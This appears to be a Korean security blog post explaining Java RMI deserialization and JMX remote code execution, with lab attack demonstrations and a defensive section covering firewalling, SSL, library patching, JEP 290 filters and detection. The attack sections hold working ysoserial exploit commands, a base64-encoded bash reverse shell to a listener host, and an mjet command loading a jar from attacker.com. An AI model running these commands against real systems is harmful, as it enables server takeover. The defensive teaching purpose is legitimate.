---
layout: post
title: "Java RMI"
date: 2025-09-22
categories: [app-hacking]
tags: [Java RMI, Deserialization, RCE, App Hacking]
description: "Java RMI 서비스의 오설정으로 인한 원격 코드 실행 취약점과 역직렬화 공격 원리 분석"
---

## 1. 개요

**Java RMI (Remote Method Invocation)**는 자바 프로그램이 네트워크 상의 다른 자바 가상 머신(JVM)에 있는 객체의 메소드를 호출하여 로컬 객체처럼 사용할 수 있게 해주는 기술이다.
편리한 분산 컴퓨팅 환경을 제공하지만, 잘못 설정된 RMI 서비스는 공격자에게 **원격 코드 실행(RCE)**의 기회를 제공하는 치명적인 취약점이 될 수 있다.

### 기본 정보
*   **기본 포트**: 1099/tcp (RMI Registry)
*   **통신 방식**: 객체 직렬화(Serialization)를 통한 데이터 전송
*   **주요 위협**: 신뢰하지 않는 데이터의 역직렬화(Deserialization)로 인한 악성 코드 실행

---

## 2. 취약점 분석

Java RMI 취약점은 주로 불필요하게 외부로 노출된 RMI 레지스트리와 안전하지 않은 역직렬화 과정에서 발생한다.

### 2.1. RMI 레지스트리 열거
공격자는 먼저 Nmap 등을 이용해 대상 서버에서 RMI 서비스가 실행 중인지 확인하고, 어떤 객체가 등록되어 있는지 정보를 수집한다.

```bash
# Nmap으로 RMI 서비스 탐지 및 정보 덤프
nmap -sV --script rmi-dumpregistry -p 1099 <target>
```

### 2.2. 역직렬화(Deserialization)
Java는 객체를 바이트 스트림으로 변환(직렬화)하여 전송하고, 받는 쪽에서 다시 객체로 복원(역직렬화)한다. 공격자는 이 과정에 악성 코드가 포함된 조작된 객체를 주입한다. 만약 서버에 취약한 라이브러리(예: Commons Collections)가 존재하면, 객체가 복원되는 순간 악성 코드가 실행된다.

---

## 3. 실습: 취약점 분석

`ysoserial` 도구를 사용하여 악성 페이로드를 생성하고 RMI 서비스에 전송하여 원격 코드를 실행하는 과정이다.

### 공격 도구 활용 (ysoserial)
```bash
# 1. 악성 페이로드 생성 (Base64 인코딩된 쉘 실행)
java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}" > payload.ser

# 2. RMI 서비스로 익스플로잇 전송
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <target> 1099 CommonsCollections5 "whoami"
```

아래는 `nmap` 스크립트를 사용하여 취약한 Java RMI 서비스를 진단하는 모습이다.

![Java RMI Enumeration](/assets/images/att-ck/3.1.5.1.java.png)

---

## 4. 보안 고려사항

Java RMI 취약점은 한 번 악용되면 **원격 코드 실행(RCE)**으로 이어지므로 치명적이다.

### 4.1. 공격 시연 (Lab 환경)

#### 공격 1: RMI Registry 열거 → 정보 수집

**[취약한 환경]**
*   RMI 포트(1099)가 외부에 노출
*   방화벽 미설정

**[공격 과정]**
```bash
# 1. RMI 서비스 탐지
nmap -sV -p 1099 --script rmi-dumpregistry <target>

# 출력 예시:
# PORT     STATE SERVICE
# 1099/tcp open  rmiregistry
# | rmi-dumpregistry:
# |   jmxrmi
# |     javax.management.remote.rmi.RMIServerImpl_Stub
# |     ...
```

**[공격 결과]**: 등록된 객체 정보 노출 → 공격 벡터 파악 🔓

---

#### 공격 2: ysoserial을 이용한 RCE

**[취약한 환경]**
*   서버에 취약한 라이브러리(Apache Commons Collections 등) 존재
*   직렬화 필터(JEP 290) 미적용

**[공격 과정]**
```bash
# 1. 공격자 PC에서 리스너 준비
nc -lvnp 4444

# 2. Reverse Shell 페이로드를 Base64로 인코딩
echo 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1' | base64
# 출력: YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==

# 3. ysoserial로 익스플로잇 전송
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <target> 1099 CommonsCollections5 \
  "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}"

# 4. 리스너에서 쉘 획득
# Connection from 10.0.0.50
# root@victim:~$ whoami
# root
```

**[공격 결과]**: 악성 직렬화 객체 → 원격 코드 실행 → 시스템 장악 🔓

---

#### 공격 3: JMX (Java Management Extensions) 악용

**[취약한 환경]**
*   JMX가 인증 없이 원격 접근 허용
*   RMI를 통해 JMX 연결 가능

**[공격 과정]**
```bash
# 1. JMX 콘솔 연결 (인증 없이)
jconsole <target>:1099

# 2. MBean을 통해 임의 명령 실행
# javax.management → MLet MBean 로드 → 악성 코드 실행

# 또는 mjet 도구 사용
java -jar mjet.jar -m load -t <target> -p 1099 -u http://attacker.com/evil.jar -payload Exec 'id'
```

**[공격 결과]**: JMX MBean을 통한 원격 코드 실행 🔓

---

### 4.2. 방어 대책

| 공격 | 방어 |
|:---|:---|
| RMI 열거 | 방어 1 |
| ysoserial RCE | 방어 2, 3, 4 |
| JMX 악용 | 방어 1, 5 |

---

#### 방어 1: 네트워크 격리

RMI 포트(1099 및 동적 포트)에 대한 외부 접근을 방화벽으로 차단한다.

```bash
# iptables: 내부 네트워크에서만 RMI 허용
iptables -A INPUT -p tcp --dport 1099 -s 10.0.0.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 1099 -j DROP

# 또는 RMI 서버 설정에서 바인딩 주소 제한
# -Djava.rmi.server.hostname=127.0.0.1
```

---

#### 방어 2: SSL/TLS 및 클라이언트 인증

RMI 통신에 암호화와 상호 인증을 적용한다.

```java
// RMI over SSL 설정
RMIClientSocketFactory csf = new SslRMIClientSocketFactory();
RMIServerSocketFactory ssf = new SslRMIServerSocketFactory();
Registry registry = LocateRegistry.createRegistry(1099, csf, ssf);
```

---

#### 방어 3: 취약 라이브러리 패치/제거

알려진 역직렬화 취약점이 있는 라이브러리를 최신 버전으로 업데이트하거나 제거한다.

**주요 취약 라이브러리:**
*   Apache Commons Collections 3.x → 4.x 이상 또는 제거
*   Spring Framework → 최신 보안 패치 적용
*   Jackson, XStream → 다형성 타입 처리 비활성화

---

#### 방어 4: 직렬화 필터 (JEP 290)

JDK 9+에서 제공하는 직렬화 필터로 화이트리스트에 없는 클래스의 역직렬화를 차단한다.

```bash
# JVM 옵션으로 필터 설정
java -Djdk.serialFilter="!*" -jar app.jar  # 모든 역직렬화 차단

# 또는 화이트리스트 방식
java -Djdk.serialFilter="com.myapp.**;java.util.*;!*" -jar app.jar
```

---

#### 방어 5: JMX 보안 강화

JMX 원격 접근 시 인증과 SSL을 강제한다.

```bash
# JVM 옵션
-Dcom.sun.management.jmxremote.authenticate=true
-Dcom.sun.management.jmxremote.ssl=true
-Dcom.sun.management.jmxremote.password.file=/path/to/jmxremote.password
```

### 4.3. 탐지 방법

*   **포트 스캔**: 외부에서 접근 가능한 1099 포트 확인.
*   **네트워크 모니터링**: RMI 프로토콜의 직렬화 헤더(`AC ED 00 05`) 트래픽 탐지.
*   **JVM 로그 분석**: `ClassNotFoundException`, `InvalidClassException` 등 역직렬화 관련 예외 모니터링.

<hr class="short-rule">
